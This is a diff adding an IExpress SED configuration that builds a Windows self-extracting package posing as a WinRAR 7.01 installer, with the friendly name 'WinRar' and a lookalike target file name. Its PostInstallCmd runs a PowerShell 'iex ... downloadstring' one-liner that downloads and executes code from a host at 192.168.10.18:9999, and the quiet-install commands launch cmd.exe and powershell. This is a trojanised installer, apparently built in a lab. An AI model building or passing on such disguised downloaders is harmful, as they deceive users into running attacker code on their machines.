@@ -1,0 +1,37 @@
+[Version]
+Class=IEXPRESS
+SEDVersion=3
+[Options]
+PackagePurpose=InstallApp
+ShowInstallProgramWindow=1
+HideExtractAnimation=1
+UseLongFileName=0
+InsideCompressed=0
+CAB_FixedSize=0
+CAB_ResvCodeSigning=0
+RebootMode=N
+InstallPrompt=%InstallPrompt%
+DisplayLicense=%DisplayLicense%
+FinishMessage=%FinishMessage%
+TargetName=%TargetName%
+FriendlyName=%FriendlyName%
+AppLaunched=%AppLaunched%
+PostInstallCmd=%PostInstallCmd%
+AdminQuietInstCmd=%AdminQuietInstCmd%
+UserQuietInstCmd=%UserQuietInstCmd%
+SourceFiles=SourceFiles
+[Strings]
+InstallPrompt=Oh cool
+DisplayLicense=
+FinishMessage=congrats
+TargetName=C:\Users\win11\Downloads\winrar-32-7.01-installer_QOz-dq1.exe
+FriendlyName=WinRar
+AppLaunched=explore.exe
+PostInstallCmd="powershell iex(new-object net.webclient).downloadstring('http://192.168.10.18:9999/noo.lnk')"
+AdminQuietInstCmd=cmd.exe
+UserQuietInstCmd=powershell
+FILE0="explore.exe"
+[SourceFiles]
+SourceFiles0=C:\Windows\System32\
+[SourceFiles0]
+%FILE0%=
